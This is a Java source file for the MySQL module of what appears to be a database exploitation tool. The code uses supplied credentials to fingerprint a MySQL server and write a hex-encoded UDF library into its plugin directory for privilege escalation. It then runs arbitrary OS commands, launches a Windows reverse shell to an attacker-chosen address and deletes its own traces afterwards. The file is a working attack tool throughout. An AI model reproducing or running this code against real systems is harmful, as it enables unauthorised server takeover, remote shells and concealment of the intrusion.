package Dao;

import Controller.MysqlController;
import Entity.ControllersFactory;
import Util.YamlConfigs;
import Util.MessageUtil;
import Util.Utils;

import java.io.File;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.sql.*;
import java.text.MessageFormat;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import Util.MysqlSqlUtil;

/**
 * @author ch1ng & j1anFen
 */
public class MysqlDao {
    private String JARFILE;
    private String JDBCURL;
    private String DRIVER;
    private String USERNAME;
    private String PASSWORD;

    private Connection CONN = null;
    private URLClassLoader URLCLASSLOADER = null;
    private Method METHOD = null;

    private String version;
    private String mysqlPlatform;
    private String systemPlatform;
    private String randomPluginFile;
    private List<String> tempFiles = new ArrayList<String>();
    private String remoteOutfile;
    private String udfFullPath;
    private String pluginFile;
    private String reversePluginFile;


    /**
     * 用此方法获取 MysqlController 的日志框
     */
    private MysqlController mysqlController = (MysqlController) ControllersFactory.controllers.get(MysqlController.class.getSimpleName());


    public MysqlDao(String ip, String port, String database, String username, String password, String timeout) throws Exception {
        YamlConfigs configs = new YamlConfigs();
        Map<String, Object> yamlToMap = configs.getYamlToMap("config.yaml");
        // 从配置文件读取变量
        JARFILE = (String) configs.getValue("Mysql.Driver", yamlToMap);
        JDBCURL = (String) configs.getValue("Mysql.JDBCUrl", yamlToMap);
        DRIVER = (String) configs.getValue("Mysql.ClassName", yamlToMap);
        // 进行时间转换
        timeout = String.valueOf(Integer.parseInt(timeout) * 1000);
        //JDBCURL = JDBCURL + "&connectTimeout=" + timeout + "&socketTimeout=" + timeout;
        JDBCURL = MessageFormat.format(JDBCURL, ip, port, database,timeout);
        USERNAME = username;
        PASSWORD = password;
        // 动态加载
        URLCLASSLOADER = (URLClassLoader) ClassLoader.getSystemClassLoader();
        METHOD = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
        METHOD.setAccessible(true);
        // 将路径转为 url 类型进行加载，修复系统路径不兼容问题
        URL url = (new File(JARFILE)).toURI().toURL();
        METHOD.invoke(URLCLASSLOADER, url);
        Class.forName(DRIVER);
    }

    /**
     * 测试是否成功连接上数据库，不需要持久化连接
     *
     * @return
     * @throws java.sql.SQLException
     */
    public void testConnection() throws java.sql.SQLException {
        if (CONN == null || CONN.isClosed()) {
            // 重新排序 Drivers 的顺序，regroupDrivers 参数是输入当前Dao类的数据库名称
            Utils.regroupDrivers("mysql");
            DriverManager.getConnection(JDBCURL, USERNAME, PASSWORD);
            closeConnection();
        }
    }

    public Connection getConnection() throws java.sql.SQLException {
        if (CONN == null || CONN.isClosed()) {
            // 重新排序 Drivers 的顺序，regroupDrivers 参数是输入当前Dao类的数据库名称
            Utils.regroupDrivers("mysql");
            CONN = DriverManager.getConnection(JDBCURL, USERNAME, PASSWORD);
        }
        return CONN;
    }

    public void closeConnection() throws java.sql.SQLException {
        if (CONN != null) {
            CONN.close();
        }
    }

    /**
     * udf 初始化
     */
    private void initUDF() {
        // UDF初始化
        try {
            if (this.version != null && this.mysqlPlatform != null && this.systemPlatform != null) {
                this.versionOutfile();
                this.Option();
                mysqlController.mysqlLogTextArea.appendText(Utils.log("本地UDF初始化成功,可尝试进行UDF提权"));
            } else {
                mysqlController.mysqlLogTextArea.appendText(Utils.log("mysql版本信息获取有误"));
            }
        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
    }

    /**
     * 获取数据库基本信息
     */
    public void getInfo() {
        try {
            // 1.sql语句
            String sql = MysqlSqlUtil.getInfoSql;

            // 2.获取SQL执行者
            PreparedStatement st = CONN.prepareStatement(sql);

            // 3.执行sql语句
            ResultSet rs = st.executeQuery();

            // 4.处理数据
            while (rs.next()) {
                String[] udfinfo = rs.getString("udfinfo").split("~");
                this.version = udfinfo[0];
                this.mysqlPlatform = udfinfo[1];
                this.systemPlatform = udfinfo[2];
            }
            String res = Utils.log(String.format("Mysql版本：%s 系统平台：%s 系统位数：%s", this.version, this.mysqlPlatform,
                    this.systemPlatform));
            mysqlController.mysqlLogTextArea.appendText(res);
            this.initUDF();
        } catch (SQLException ex) {
            String error = ex.getMessage();
            MessageUtil.showExceptionMessage(ex, error);
        }
    }

    /**
     * 确定本地使用udf函数文件路径
     * 测试发现win64系统下安装win32 mysql dll库依赖32位mysql 64失效
     */
    private void Option() {
        try {
            String path = null;
            if (mysqlPlatform.startsWith("Win")) {
                mysqlController.mysqlLogTextArea.appendText(Utils.log("windows服务器udf失败可尝试直接反弹shell"));
                int versionNumber = Integer.parseInt(mysqlPlatform.substring(3));
                if (versionNumber == 32) {
                    path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Mysql" + File.separator + "udf_win32_hex.txt";
                    pluginFile = Utils.readFile(path);
                } else {
                    path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Mysql" + File.separator + "udf_win64_hex.txt";
                    pluginFile = Utils.readFile(path);
                }
            } else {
                if (systemPlatform.contains("64")) {
                    path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Mysql" + File.separator + "udf_linux64_hex.txt";
                    pluginFile = Utils.readFile(path);
                } else {
                    path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Mysql" + File.separator + "udf_linux32_hex.txt";
                    pluginFile = Utils.readFile(path);
                }
            }
        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
    }

    /**
     * 确定导出路径
     * MySQL<5.0，导出路径随意；
     * 5.0 <= MySQL<5.1，则需要导出至目标服务器的系统目录（如：c:/windows/system32/）
     * MySQL 5.1以上版本，必须要把udf.dll文件放到MySQL安装目录下的lib\plugin文件夹下才能创建自定义函数。
     */
    public void versionOutfile() throws SQLException {
        if (this.version != null) {
            String[] versions = version.split("\\.");
            if (Integer.parseInt(versions[0]) < 5) {
                if (mysqlPlatform.startsWith("Win")) {
                    remoteOutfile = "c:\\windows\\temp\\";
                } else {
                    remoteOutfile = "/tmp/";
                }
            } else {
                this.plugin_dir();
            }
        }
    }

    /**
     * mysql >= 5.1 获取插件目录
     */
    private void plugin_dir() throws SQLException {

        String sql = MysqlSqlUtil.pluginDirSql;
        PreparedStatement st = CONN.prepareStatement(sql);
        ResultSet rs = st.executeQuery();
        while (rs.next()) {
            remoteOutfile = rs.getString("plugin_dir");
            if (mysqlPlatform.startsWith("Win")) {
                remoteOutfile = remoteOutfile.replace("\\", "\\\\");
            }
        }
    }

    /**
     * 导入插件和初始化函数
     */
    public void udf(String funcEvil) {
        String content;
        try {
            if (funcEvil.equals("backshell")) {
                content = reversePluginFile;
            } else {
                content = pluginFile;
            }

            // 清除遗留函数
            this.removeEvilFunc();

            // 初始化完整udf导出路径
            randomPluginFile = Long.toHexString(Double.doubleToLongBits(Math.random())) + ".temp";

            // 清理所有残留临时文件
            tempFiles.add(randomPluginFile);

            // 获取完整导出路径
            udfFullPath = remoteOutfile + randomPluginFile;

            String sql = String.format(MysqlSqlUtil.udfExportSql, content,udfFullPath);

            // 3.获取SQL执行者
            PreparedStatement st = CONN.prepareStatement(sql);

            // 5.执行sql语句
            st.execute();
            mysqlController.mysqlLogTextArea.appendText(Utils.log("库文件写入成功"));
            //PublicUtil.log("插件UDF写入成功");

            String sqlEval = String.format(MysqlSqlUtil.createFunctionSql,funcEvil,randomPluginFile);
            //System.out.println(sqlEval);
            PreparedStatement st1 = CONN.prepareStatement(sqlEval);
            st1.execute();

            mysqlController.mysqlLogTextArea.appendText(Utils.log("函数 " + funcEvil + " 创建执行成功"));
        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
    }



    /**
     * 执行命令
     *
     * @param command
     * @return
     */
    public String eval(String command, String code) {
        try {
            String sql = String.format(MysqlSqlUtil.evalSql, command);
            PreparedStatement st = CONN.prepareStatement(sql);
            ResultSet rs = st.executeQuery();
            while (rs.next()) {
                String ss = new String(rs.getBytes("s"), code);
                return ss;
            }
        } catch (NullPointerException e) {
            return "命令执行完成";
        } catch (Exception e) {
            String res = e.getMessage();
            if (res.contains("does not exist")) {
                mysqlController.mysqlLogTextArea.appendText(Utils.log("命令函数不存在！请创建！"));
                return "";
            }
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
        return "";
    }

    /**
     * backShell win反弹shell
     *
     * @throws SQLException
     */
    public String backShell(String reverseAddress, int port, String code) {
        try {
            String sql = String.format(MysqlSqlUtil.reverseShellSql, reverseAddress, port);
            PreparedStatement st = CONN.prepareStatement(sql);
            ResultSet rs = st.executeQuery();
            while (rs.next()) {
                return new String(rs.getBytes("s"), code);
            }
        } catch (NullPointerException e) {
            return "命令执行完成";
        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
        return "";
    }

    /**
     * ntfs 创建目录
     *
     * @throws SQLException
     */
    public void ntfsdir() {
        try {
            String sql = String.format(MysqlSqlUtil.ntfsCreateDirectory,remoteOutfile.substring(0, remoteOutfile.length() - 1) );
            PreparedStatement st = CONN.prepareStatement(sql);
            st.execute();
            mysqlController.mysqlLogTextArea.appendText(Utils.log("目录创建成功"));
        } catch (Exception e) {
            String res = e.getMessage();
            if (res.contains("already exists")) {
                mysqlController.mysqlLogTextArea.appendText(Utils.log("目录已存在！"));
                return;
            }
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
    }

    /**
     * win 反弹shell
     *
     * @throws SQLException
     */
    public void reverseShell(String reverseAddress, String reversePort, String code) {
        try {
            // 重新加载反弹shell dll
            String path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Mysql" + File.separator + "udf_win_ex_hex.txt";
            reversePluginFile = Utils.readFile(path);
            this.udf("backshell");
            backShell(reverseAddress, Integer.parseInt(reversePort), code);
        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
    }

    public void removeEvilFunc() {
        try {
            String cleanSql = MysqlSqlUtil.cleanSql;
            PreparedStatement st1 = CONN.prepareStatement(cleanSql);
            st1.execute();

            String cleanSql1 = MysqlSqlUtil.cleanSql2;
            PreparedStatement st2 = CONN.prepareStatement(cleanSql1);
            st2.execute();
        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
    }

    /**
     * 清理痕迹
     *
     * @throws SQLException
     */
    public void cleanudf() {
        String rmplugin = null;

        try {
            mysqlController.mysqlLogTextArea.appendText(Utils.log("删除服务器UDF遗留文件"));
            String tempPath = remoteOutfile + "*.temp";
            if (mysqlPlatform.startsWith("Win")) {
                rmplugin = "del /f " + tempPath;
            } else {
                rmplugin = "rm -f " + tempPath;
            }
            eval(rmplugin, "UTF-8");
            mysqlController.mysqlLogTextArea.appendText(Utils.log("卸载所有恶意函数"));
            // 删除恶意函数
            this.removeEvilFunc();

//            if(tempFiles.size() > 0) {
//                Iterator<String> it = tempFiles.iterator();
//                while (it.hasNext()) {
//                    String tempFile = it.next();
//                    String tempPath = remoteOutfile + tempFile;
//                    if (mysqlPlatform.startsWith("Win")) {
//                        rmplugin = "del /f " + tempPath;
//                    } else {
//                        rmplugin = "rm -f " + tempPath;
//                    }
//                    String aa = eval(rmplugin, "UTF-8");
//                    System.out.println(aa);
//                }
//
//                // 重新初始化
//                tempFiles = new ArrayList<String>();
        } catch (Exception e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
    }
//    public static void main(String[] args) {
//        try {
//            MysqlDao md = new MysqlDao("192.168.18.159","3306","mysql","root","root");
//            System.out.println(testConnection());
//            System.out.println("success");
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//    }
}
